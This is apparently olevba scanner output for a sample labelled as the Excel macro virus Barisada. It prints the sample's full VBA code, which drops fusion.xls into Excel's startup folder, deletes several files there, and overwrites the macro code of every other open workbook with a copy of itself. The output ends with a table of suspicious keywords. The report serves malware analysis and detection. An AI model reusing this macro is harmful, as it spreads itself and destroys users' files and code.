olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Barisada.m-55c7fa4b9e4de0083dbcb1e2f2ed3f4c628087a4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Barisada.m-55c7fa4b9e4de0083dbcb1e2f2ed3f4c628087a4 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub workbook_windowdeactivate(ByVal wn As Excel.Window)

Dim ne_pyun As String
On Error Resume Next
ne_pyun = Dir(Application.StartupPath & "\fusion.xls") 'fusion°Ë»ç
If ne_pyun <> "fusion.xls" Then
    Application.ScreenUpdating = False
    Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\fusion.xls", FileFormat:=xlNormal, addtomru:=False
    'Workbooks("fusion").IsAddin = True
    Kill (Application.StartupPath & "\hjb.xls")
    Kill (Application.StartupPath & "\874.xls")
    Kill (Application.StartupPath & "\khm.xls")
End If

Dim i, lines, ne_pyun_rank As Integer
Dim codeform, ne_pyun_codes As String
For i = 1 To Workbooks.Count
    lines = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
    codeform = Null
    codeform = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.lines(lines, 1)
    If lines <> 0 Then
        If codeform = "'hihihihohoho" Then
            ne_pyun_codes = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.lines(1, lines)
            ne_pyun_rank = i
        End If
    End If
Next i
    
Dim j, k As Integer
For j = 1 To Workbooks.Count
    If j = ne_pyun_rank Then GoTo line100
    For k = 1 To Workbooks(j).VBProject.VBComponents.Count
        lines = Workbooks(j).VBProject.VBComponents.Item(k).CodeModule.CountOfLines
        If lines <> 0 Then
            Workbooks(j).VBProject.VBComponents.Item(k).CodeModule.DeleteLines 1, lines
        End If
    Next k
    Workbooks(j).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString (ne_pyun_codes)
line100:
Next j

If ne_pyun <> "fusion.xls" Then
    Workbooks("fusion.xls").Close savechanges:=True
End If

End Sub
'hihihihohoho
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Barisada.m-55c7fa4b9e4de0083dbcb1e2f2ed3f4c628087a4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Barisada.m-55c7fa4b9e4de0083dbcb1e2f2ed3f4c628087a4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Barisada.m-55c7fa4b9e4de0083dbcb1e2f2ed3f4c628087a4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

